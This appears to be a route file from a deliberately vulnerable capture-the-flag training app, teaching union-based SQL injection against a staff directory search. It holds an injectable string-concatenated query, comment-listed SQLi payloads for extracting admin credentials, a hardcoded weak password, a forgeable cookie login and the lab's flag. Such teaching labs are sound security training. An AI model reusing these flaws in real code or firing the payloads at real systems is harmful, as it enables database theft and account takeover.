const express = require('express');
const router = express.Router();

// Lab 05: Union-Based SQL Injection - Staff Directory Search
// INTENTIONALLY VULNERABLE - DO NOT USE IN PRODUCTION

// Admin credentials (the "secret" that students extract via Union SQLi)
// Password hash e10adc3949ba59abbe56e057f20f883e = MD5("123456")
const ADMIN_USERNAME = 'superadmin';
const ADMIN_PASSWORD = '123456';

// Staff Directory Search (vulnerable to Union SQLi)
router.get('/', async (req, res) => {
  const pool = req.app.locals.pool;
  const search = req.query.q || '';

  let staff = [];
  let error = null;

  if (search) {
    try {
      // VULNERABLE: Direct string concatenation - Union-Based SQL Injection possible
      // Attack steps:
      // 1. ' ORDER BY 4-- (find columns)
      // 2. ' UNION SELECT 1,2,3,4-- (find display columns)
      // 3. ' UNION SELECT 1,version(),3,4-- (DB version)
      // 4. ' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=current_schema()-- (list tables)
      // 5. ' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='admin_credentials'-- (list columns)
      // 6. ' UNION SELECT 1,username,password_hash,role FROM admin_credentials-- (extract creds)

      const query = `SELECT id, name, department, position FROM staff WHERE name LIKE '%${search}%' OR department LIKE '%${search}%'`;

      console.log('[Lab05] Executing query:', query);

      const result = await pool.query(query);
      staff = result.rows;

    } catch (err) {
      console.error('[Lab05] SQL Error:', err.message);
      // Show error for educational purposes (error-based SQLi detection)
      error = err.message;
    }
  }

  res.render('labs/lab05', {
    title: 'Staff Directory',
    search: search,
    staff: staff,
    error: error
  });
});

// Admin Login Page
router.get('/admin', (req, res) => {
  // Check if already logged in
  if (req.cookies.lab05_admin === 'superadmin') {
    return res.redirect('/lab05/admin/dashboard');
  }

  res.render('labs/lab05-admin-login', {
    title: 'Admin Login',
    error: null
  });
});

// Admin Login Handler
router.post('/admin', (req, res) => {
  const { username, password } = req.body;

  console.log('[Lab05] Admin login attempt:', username);

  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
    // Set admin session cookie
    res.cookie('lab05_admin', 'superadmin', { httpOnly: true });
    return res.redirect('/lab05/admin/dashboard');
  }

  res.render('labs/lab05-admin-login', {
    title: 'Admin Login',
    error: 'ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง'
  });
});

// Admin Dashboard (requires login)
router.get('/admin/dashboard', (req, res) => {
  if (req.cookies.lab05_admin !== 'superadmin') {
    return res.redirect('/lab05/admin');
  }

  res.render('labs/lab05-admin', {
    title: 'Admin Dashboard',
    flag: 'SMC{un10n_2_4dm1n_p4n3l}'
  });
});

// Admin Logout
router.get('/admin/logout', (req, res) => {
  res.clearCookie('lab05_admin');
  res.redirect('/lab05/admin');
});

module.exports = router;
